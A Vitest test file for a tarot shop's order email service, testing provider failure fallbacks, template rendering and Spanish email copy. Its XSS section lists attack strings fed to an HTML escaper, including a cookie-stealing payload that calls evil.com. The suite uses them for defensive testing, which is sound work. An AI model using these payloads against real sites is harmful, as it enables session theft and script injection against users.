import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import nodemailer from 'nodemailer';
import {
  EmailService,
  MockEmailProvider,
  ConsoleEmailProvider,
  SmtpEmailProvider,
  ResendEmailProvider,
  escapeHtml,
  EmailPayload,
} from '../../src/server/services/email.service.js';
import { config, AppConfig } from '../../src/server/config.js';
import { Order, TIER_CONFIG } from '../../src/server/types/checkout.types.js';

describe('Milestone 3 Adversarial & Stress Suite: Order Email Dispatcher & Templates', () => {
  beforeEach(() => {
    EmailService.clearCapturedEmails();
    EmailService.resetProvider();
  });

  afterEach(() => {
    EmailService.clearCapturedEmails();
    EmailService.resetProvider();
    vi.restoreAllMocks();
  });

  function makeOrder(overrides: Partial<Order> = {}): Order {
    return {
      id: 'ord_adv_' + Math.random().toString(36).substring(2, 9),
      tier_id: '1_carta',
      category: 'Amor',
      amount_mxn: 150,
      customer_name: 'Ana Laura Ramos',
      customer_email: 'ana.laura@example.com',
      customer_birthdate: '1993-07-22',
      customer_phone: '+52 871 555 1234',
      question: '¿Qué me depara el futuro en el amor?',
      status: 'approved',
      email_sent: 0,
      customer_email_sent: 0,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
      ...overrides,
    };
  }

  // =========================================================================
  // 1. PROVIDER ADVERSARIAL STRESS & FAULT INJECTION
  // =========================================================================
  describe('1. Provider Adversarial Stress & Fault Injection', () => {
    const payload: EmailPayload = {
      to: 'cliente@destinatario.mx',
      from: 'Lumina Umay <contacto@luminaumay.com>',
      subject: 'Prueba de Estrés Provider',
      text: 'Texto de prueba de estrés.',
      html: '<p>HTML de prueba de estrés.</p>',
    };

    it('1.1 MockProvider: withstands high throughput email capture without data corruption', async () => {
      const mock = new MockEmailProvider();
      const count = 200;
      const promises = Array.from({ length: count }, (_, i) =>
        mock.sendEmail({
          ...payload,
          subject: `Bulk Stress Test #${i}`,
        })
      );

      const results = await Promise.all(promises);
      expect(results.length).toBe(count);
      results.forEach((res, i) => {
        expect(res.success).toBe(true);
        expect(res.provider).toBe('mock');
        expect(res.messageId).toContain('mock-');
      });

      const captured = EmailService.getCapturedEmails();
      expect(captured.length).toBe(count);
      expect(captured[0].subject).toBe('Bulk Stress Test #0');
      expect(captured[count - 1].subject).toBe(`Bulk Stress Test #${count - 1}`);
    });

    it('1.2 ConsoleProvider: safely handles special characters, unicode, and multiline body in console log', async () => {
      const consoleSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
      const provider = new ConsoleEmailProvider();

      const unicodePayload: EmailPayload = {
        to: 'claudia@luminaumay.com',
        subject: '✨ Luna Nueva 🌙 Lectura Ancestral 🔮 — 100% México 🇲🇽',
        text: 'Línea 1 con acentos: áéíóú ñ ¿¡\nLínea 2 con emojis: 🪬🧿💫\nLínea 3: "comillas" & \'apóstrofes\'',
        html: '<p>HTML con acentos y emojis 🇲🇽</p>',
      };

      const result = await provider.sendEmail(unicodePayload);
      expect(result.success).toBe(true);
      expect(result.provider).toBe('console');
      expect(consoleSpy).toHaveBeenCalled();

      const captured = EmailService.getCapturedEmails();
      expect(captured.length).toBe(1);
      expect(captured[0].subject).toContain('✨ Luna Nueva 🌙');
      expect(captured[0].body).toContain('áéíóú ñ ¿¡');
    });

    it('1.3 SmtpProvider: unconfigured / blank credentials falls back gracefully without throwing', async () => {
      const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
      const emptyConfig: AppConfig = {
        ...config,
        smtpHost: '',
        smtpUser: '',
        smtpPass: '',
        smtpPort: 587,
      };

      const provider = new SmtpEmailProvider(emptyConfig);
      const result = await provider.sendEmail(payload);

      expect(result.success).toBe(true);
      expect(result.fallbackUsed).toBe(true);
      expect(result.provider).toBe('smtp');
      expect(warnSpy).toHaveBeenCalled();

      const captured = EmailService.getCapturedEmails();
      expect(captured.length).toBe(1);
      expect(captured[0].provider).toBe('smtp-fallback');
    });

    it('1.4 SmtpProvider: simulated TCP connection timeout triggers error fallback without unhandled exception', async () => {
      const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
      const sendMailMock = vi.fn().mockRejectedValue(new Error('ETIMEDOUT: Connection to smtp.mailgun.org:587 timed out'));
      vi.spyOn(nodemailer, 'createTransport').mockReturnValue({ sendMail: sendMailMock } as any);

      const smtpConfig: AppConfig = {
        ...config,
        smtpHost: 'smtp.mailgun.org',
        smtpUser: 'valid_user',
        smtpPass: 'valid_pass',
      };

      const provider = new SmtpEmailProvider(smtpConfig);
      const result = await provider.sendEmail(payload);

      expect(result.success).toBe(false);
      expect(result.fallbackUsed).toBe(true);
      expect(result.error).toContain('ETIMEDOUT');
      expect(errorSpy).toHaveBeenCalled();

      const captured = EmailService.getCapturedEmails();
      expect(captured.length).toBe(1);
      expect(captured[0].provider).toBe('smtp-error-fallback');
    });

    it('1.5 SmtpProvider: SMTP 535 authentication rejected triggers error fallback without crash', async () => {
      const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
      const sendMailMock = vi.fn().mockRejectedValue(new Error('535 5.7.8 Authentication credentials invalid'));
      vi.spyOn(nodemailer, 'createTransport').mockReturnValue({ sendMail: sendMailMock } as any);

      const smtpConfig: AppConfig = {
        ...config,
        smtpHost: 'smtp.gmail.com',
        smtpUser: 'wrong_user@gmail.com',
        smtpPass: 'wrong_app_password',
      };

      const provider = new SmtpEmailProvider(smtpConfig);
      const result = await provider.sendEmail(payload);

      expect(result.success).toBe(false);
      expect(result.fallbackUsed).toBe(true);
      expect(result.error).toContain('535 5.7.8');

      const captured = EmailService.getCapturedEmails();
      expect(captured.length).toBe(1);
      expect(captured[0].provider).toBe('smtp-error-fallback');
    });

    it('1.6 ResendProvider: unconfigured API key falls back gracefully', async () => {
      const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
      const resendConfig: AppConfig = {
        ...config,
        resendApiKey: '',
      };

      const provider = new ResendEmailProvider(resendConfig);
      const result = await provider.sendEmail(payload);

      expect(result.success).toBe(true);
      expect(result.fallbackUsed).toBe(true);
      expect(result.provider).toBe('resend');
      expect(warnSpy).toHaveBeenCalled();

      const captured = EmailService.getCapturedEmails();
      expect(captured.length).toBe(1);
      expect(captured[0].provider).toBe('resend-fallback');
    });

    it('1.7 ResendProvider: handles HTTP 401 Unauthorized, 403 Forbidden, 422 Unprocessable, and 500 Internal Server Error', async () => {
      const statusCodes = [
        { code: 401, error: 'API key expired or invalid' },
        { code: 403, error: 'Domain luminaumay.com not verified on Resend' },
        { code: 422, error: 'Missing required to field or invalid email RFC 5322' },
        { code: 500, error: 'Resend internal upstream cluster failure' },
      ];

      for (const { code, error } of statusCodes) {
        EmailService.clearCapturedEmails();
        const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});

        const fetchMock = vi.fn().mockResolvedValue({
          ok: false,
          status: code,
          text: async () => JSON.stringify({ statusCode: code, message: error }),
        });
        global.fetch = fetchMock as any;

        const resendConfig: AppConfig = {
          ...config,
          resendApiKey: 're_dummy_test_key',
        };

        const provider = new ResendEmailProvider(resendConfig);
        const result = await provider.sendEmail(payload);

        expect(result.success).toBe(false);
        expect(result.fallbackUsed).toBe(true);
        expect(result.error).toContain(error);
        expect(errorSpy).toHaveBeenCalled();

        const captured = EmailService.getCapturedEmails();
        expect(captured.length).toBe(1);
        expect(captured[0].provider).toBe('resend-api-error-fallback');
      }
    });

    it('1.8 ResendProvider: handles fetch network abort / DNS resolution failure', async () => {
      const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {});
      const fetchMock = vi.fn().mockRejectedValue(new TypeError('fetch failed: getaddrinfo ENOTFOUND api.resend.com'));
      global.fetch = fetchMock as any;

      const resendConfig: AppConfig = {
        ...config,
        resendApiKey: 're_valid_looking_key',
      };

      const provider = new ResendEmailProvider(resendConfig);
      const result = await provider.sendEmail(payload);

      expect(result.success).toBe(false);
      expect(result.fallbackUsed).toBe(true);
      expect(result.error).toContain('ENOTFOUND');
      expect(errorSpy).toHaveBeenCalled();

      const captured = EmailService.getCapturedEmails();
      expect(captured.length).toBe(1);
      expect(captured[0].provider).toBe('resend-network-error-fallback');
    });

    it('1.9 EmailService.getProvider: properly selects provider based on config and case insensitivity', () => {
      EmailService.resetProvider();

      // Test default mock
      const defaultProvider = EmailService.getProvider();
      expect(defaultProvider.name).toBe('mock');

      // Test custom provider override
      const customMock: any = { name: 'mock', sendEmail: vi.fn() };
      EmailService.setProvider(customMock);
      expect(EmailService.getProvider()).toBe(customMock);

      EmailService.resetProvider();
      expect(EmailService.getProvider().name).toBe('mock');
    });
  });

  // =========================================================================
  // 2. TEMPLATE ENGINE ROBUSTNESS & EDGE CASE MINING
  // =========================================================================
  describe('2. Template Engine Robustness & Edge Cases', () => {
    it('2.1: Handles deeply nested #if, #unless, and else conditions', () => {
      const template = `{{#if outer}}OUTER_ON[{{#if inner}}INNER_ON{{else}}INNER_OFF{{/if}}]{{else}}OUTER_OFF[{{#unless inner}}NOT_INNER{{else}}IS_INNER{{/unless}}]{{/if}}`;

      expect(EmailService.renderTemplateString(template, { outer: true, inner: true })).toBe('OUTER_ON[INNER_ON]');
      expect(EmailService.renderTemplateString(template, { outer: true, inner: false })).toBe('OUTER_ON[INNER_OFF]');
      expect(EmailService.renderTemplateString(template, { outer: false, inner: false })).toBe('OUTER_OFF[NOT_INNER]');
      expect(EmailService.renderTemplateString(template, { outer: false, inner: true })).toBe('OUTER_OFF[IS_INNER]');
    });

    it('2.2: Handles missing variables, null, undefined, 0, and false without throwing or corrupting output', () => {
      const template = `Name: {{name}}, Count: {{count}}, Zero: {{zero}}, Flag: {{flag}}, Missing: {{nonExistent}}`;
      const data = {
        name: 'Sofia',
        count: null,
        zero: 0,
        flag: false,
      };

      const rendered = EmailService.renderTemplateString(template, data);
      expect(rendered).toBe('Name: Sofia, Count: , Zero: 0, Flag: false, Missing: ');
    });

    it('2.3: Handles massive text payloads (50,000 characters) with fast execution (<50ms)', () => {
      const largeQuestion = '¿Cuál es mi destino espiritual? ' + 'Tarot Lumina Umay '.repeat(3000);
      expect(largeQuestion.length).toBeGreaterThan(50000);

      const template = `<p>Pregunta: {{question}}</p>{{#if has_focus}}<p>Enfoque: {{focus}}</p>{{/if}}`;
      const data = {
        question: largeQuestion,
        has_focus: true,
        focus: 'Enfoque general de vida ' + 'Aura Dorada '.repeat(1000),
      };

      const start = performance.now();
      const rendered = EmailService.renderTemplateString(template, data);
      const duration = performance.now() - start;

      expect(rendered).toContain(largeQuestion);
      expect(duration).toBeLessThan(100); // Super fast execution
    });

    it('2.4: Handles consecutive tags, empty templates, and templates without tags', () => {
      expect(EmailService.renderTemplateString('', { name: 'Test' })).toBe('');
      expect(EmailService.renderTemplateString('Plain static text with no tags', {})).toBe('Plain static text with no tags');
      expect(EmailService.renderTemplateString('{{a}}{{b}}{{c}}', { a: '1', b: '2', c: '3' })).toBe('123');
      expect(EmailService.renderTemplateString('{{#if a}}A{{/if}}{{#if b}}B{{/if}}{{#if c}}C{{/if}}', { a: true, b: false, c: true })).toBe('AC');
    });

    it('2.5: Renders Claudia template and Customer template from filesystem and caches them', () => {
      const order = makeOrder({ tier_id: '1_carta' });

      // First render (cache miss -> reads disk)
      const html1 = EmailService.renderTemplate('claudia-notification', {
        order_id: order.id,
        amount_mxn: 150,
        customer_name: order.customer_name,
        customer_email: order.customer_email,
        customer_birthdate: order.customer_birthdate,
        tier_name: 'Lectura de 1 Carta',
        category: 'Amor',
        question: order.question,
        is_call: false,
      });
      expect(html1).toContain('LUMINA UMAY');
      expect(html1).toContain('150');

      // Second render (cache hit)
      const html2 = EmailService.renderTemplate('claudia-notification', {
        order_id: order.id,
        amount_mxn: 150,
        customer_name: 'Otro Nombre',
        customer_email: 'otro@example.com',
        customer_birthdate: '1990-01-01',
        tier_name: 'Lectura de 1 Carta',
        category: 'Amor',
        question: 'Pregunta dos',
        is_call: false,
      });
      expect(html2).toContain('Otro Nombre');
    });
  });

  // =========================================================================
  // 3. ADVERSARIAL XSS INJECTION & HTML ESCAPING
  // =========================================================================
  describe('3. Adversarial XSS Attacks & HTML Escaping', () => {
    const maliciousVectors = [
      '<script>alert("XSS")</script>',
      '<SCRIPT SRC="https://evil.com/xss.js"></SCRIPT>',
      '<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
      '<svg/onload=alert(\'XSS\')>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '"><script>alert(document.domain)</script>',
      '"><img src=x onerror=alert(1)>',
      '\' onmouseover=\'alert(1)',
      '<a href="javascript:alert(\'pwned\')">Click me</a>',
      '"><body onload=alert(1)>',
      '<<SCRIPT>alert("XSS");//<</SCRIPT>',
      '<div style="background:url(\'javascript:alert(1)\')">',
    ];

    it('3.1: escapeHtml sanitizes all classical and polyglot XSS vectors', () => {
      for (const vector of maliciousVectors) {
        const escaped = escapeHtml(vector);
        expect(escaped).not.toContain('<script');
        expect(escaped).not.toContain('<SCRIPT');
        expect(escaped).not.toContain('<img');
        expect(escaped).not.toContain('<svg');
        expect(escaped).not.toContain('<iframe');
        expect(escaped).not.toContain('<a ');
        expect(escaped).not.toContain('<div');
        expect(escaped).not.toContain('<body');
        expect(escaped).not.toContain('"');
        expect(escaped).not.toContain("'");
      }
    });

    it('3.2: Full XSS blast test across ALL user-controlled Order fields in Claudia email', async () => {
      const order = makeOrder({
        id: 'ord_xss_claudia_<script>1</script>',
        mp_payment_id: 'mp_pay_<img src=x onerror=alert(1)>',
        customer_name: 'Attacker <script>alert("name")</script>',
        customer_email: 'attacker+<script>@evil.com',
        customer_phone: '+52 <script>871111</script>',
        customer_birthdate: '1990-01-01"><script>alert("dob")</script>',
        category: 'Amor"><script>alert("cat")</script>',
        question: 'Pregunta con <script>alert("q")</script> & <img src=x onerror=bad()>',
        involved_names: 'Persona <b onmouseover="alert(\'involved\')">Involucrada</b>',
        core_focus: 'Enfoque con <iframe src="http://evil.com"></iframe>',
      });

      await EmailService.sendOrderNotificationToClaudia(order);

      const captured = EmailService.getCapturedEmails();
      expect(captured.length).toBe(1);
      const email = captured[0];

      expect(email.html).toBeDefined();
      const html = email.html!;

      // Raw unescaped dangerous tags must NOT be present
      expect(html).not.toContain('<script>alert("name")</script>');
      expect(html).not.toContain('<script>alert("dob")</script>');
      expect(html).not.toContain('<script>alert("cat")</script>');
      expect(html).not.toContain('<script>alert("q")</script>');
      expect(html).not.toContain('<img src=x onerror=bad()>');
      expect(html).not.toContain('<b onmouseover=');
      expect(html).not.toContain('<iframe');

      // Escaped safe variants MUST be present
      expect(html).toContain('&lt;script&gt;alert(&quot;name&quot;)&lt;/script&gt;');
      expect(html).toContain('&lt;img src=x onerror=bad()&gt;');
      expect(html).toContain('&lt;iframe src=&quot;http://evil.com&quot;&gt;&lt;/iframe&gt;');
    });

    it('3.3: Full XSS blast test across ALL user-controlled Order fields in Customer email', async () => {
      const order = makeOrder({
        id: 'ord_xss_cust_<script>2</script>',
        customer_name: 'Víctima <svg onload=alert(1)>',
        customer_email: 'victima@example.com',
        question: 'Mi pregunta con <a href="javascript:alert(1)">enlace malicioso</a>',
        category: 'Trabajo/Dinero <script>hack()</script>',
      });

      await EmailService.sendConfirmationToCustomer(order);

      const captured = EmailService.getCapturedEmails();
      expect(captured.length).toBe(1);
      const email = captured[0];

      expect(email.html).toBeDefined();
      const html = email.html!;

      expect(html).not.toContain('<svg onload=alert(1)>');
      expect(html).not.toContain('<a href="javascript:alert(1)">');
      expect(html).not.toContain('<script>hack()</script>');

      expect(html).toContain('&lt;svg onload=alert(1)&gt;');
      expect(html).toContain('&lt;a href=&quot;javascript:alert(1)&quot;&gt;enlace malicioso&lt;/a&gt;');
      expect(html).toContain('&lt;script&gt;hack()&lt;/script&gt;');
    });
  });

  // =========================================================================
  // 4. MEXICAN SPANISH COPY FIDELITY & SLA INTEGRITY
  // =========================================================================
  describe('4. Mexican Spanish Copy Fidelity & SLA Integrity', () => {
    it('4.1: Category A async readings (1, 3, 5 cartas) include exact 24-hour turnaround SLA and Claudia sign-off', async () => {
      const tiers: Array<{ tier: '1_carta' | '3_cartas' | '5_cartas'; price: number; name: string }> = [
        { tier: '1_carta', price: 150, name: 'Lectura de 1 Carta' },
        { tier: '3_cartas', price: 350, name: 'Lectura de 3 Cartas' },
        { tier: '5_cartas', price: 500, name: 'Lectura de 5 Cartas' },
      ];

      for (const { tier, price, name } of tiers) {
        EmailService.clearCapturedEmails();
        const order = makeOrder({
          tier_id: tier,
          amount_mxn: price,
          customer_name: 'Mariana Gomez',
          customer_email: 'mariana@example.com',
        });

        // Test Claudia notification
        await EmailService.sendOrderNotificationToClaudia(order);
        // Test Customer confirmation
        await EmailService.sendConfirmationToCustomer(order);

        const captured = EmailService.getCapturedEmails();
        expect(captured.length).toBe(2);

        const claudiaEmail = captured[0];
        const customerEmail = captured[1];

        // Claudia email checks
        expect(claudiaEmail.subject).toContain(name);
        expect(claudiaEmail.html).toContain('24 horas');
        expect(claudiaEmail.html).toContain('Compromiso de Entrega Asíncrona');
        expect(claudiaEmail.html).toContain(`$${price} MXN`);

        // Customer email checks
        expect(customerEmail.subject).toBe('Confirmación de tu lectura — Lumina Umay');
        expect(customerEmail.html).toContain('24 horas');
        expect(customerEmail.html).toContain('Garantía de Entrega (24 Horas)');
        expect(customerEmail.html).toContain('Con luz, gratitud y bendiciones');
        expect(customerEmail.html).toContain('Claudia — Lumina Umay');
        expect(customerEmail.body).toContain('24 horas');
        expect(customerEmail.body).toContain('Lumina Umay');
      }
    });

    it('4.2: Category B live call session includes CDMX timezone, preparation advice, and NO async SLA banner', async () => {
      const order = makeOrder({
        tier_id: 'llamada',
        amount_mxn: 450,
        customer_name: 'Roberto Valenzuela',
        customer_email: 'roberto@example.com',
        slot_id: 'slot_cdmx_123',
      });

      const slotDetails = {
        date: '2026-08-25',
        time_start: '17:00',
        time_end: '17:45',
      };

      await EmailService.sendOrderNotificationToClaudia(order, slotDetails);
      await EmailService.sendConfirmationToCustomer(order, slotDetails);

      const captured = EmailService.getCapturedEmails();
      expect(captured.length).toBe(2);

      const claudiaEmail = captured[0];
      const customerEmail = captured[1];

      // Claudia Call Email checks
      expect(claudiaEmail.html).toContain('Horario de Llamada Reservado');
      expect(claudiaEmail.html).toContain('2026-08-25');
      expect(claudiaEmail.html).toContain('17:00 - 17:45 hrs (CDMX)');
      expect(claudiaEmail.html).not.toContain('Compromiso de Entrega Asíncrona');
      expect(claudiaEmail.html).not.toContain('plazo máximo de 24 horas');

      // Customer Call Email checks
      expect(customerEmail.html).toContain('Cita de Llamada Confirmada');
      expect(customerEmail.html).toContain('2026-08-25');
      expect(customerEmail.html).toContain('17:00 - 17:45 hrs (Hora de la Ciudad de México)');
      expect(customerEmail.html).toContain('espacio tranquilo y libre de distracciones 5 minutos antes');
      expect(customerEmail.html).not.toContain('Garantía de Entrega (24 Horas)');
      expect(customerEmail.html).not.toContain('plazo máximo de 24 horas');
      expect(customerEmail.html).toContain('Con luz, gratitud y bendiciones');
      expect(customerEmail.html).toContain('Claudia — Lumina Umay');

      // Plaintext checks
      expect(customerEmail.body).toContain('2026-08-25');
      expect(customerEmail.body).toContain('17:00 - 17:45 hrs (Hora Ciudad de México)');
      expect(customerEmail.body).toContain('Claudia se conectará contigo puntualmente');
    });

    it('4.3: Brand styling, typography, and color tokens exist in rendered HTML', async () => {
      const order = makeOrder({ tier_id: '1_carta' });

      await EmailService.sendOrderNotificationToClaudia(order);
      await EmailService.sendConfirmationToCustomer(order);

      const [claudiaEmail, customerEmail] = EmailService.getCapturedEmails();

      for (const email of [claudiaEmail, customerEmail]) {
        const html = email.html!;
        expect(html).toContain('LUMINA UMAY');
        expect(html).toContain('#0d2b2a'); // --teal
        expect(html).toContain('#081d1c'); // --teal-deep
        expect(html).toContain('#d4af37'); // --gold
        expect(html).toContain('#fbf8f2'); // --cream
        expect(html).toContain('Cormorant Garamond');
        expect(html).toContain('Jost');
      }
    });
  });
});
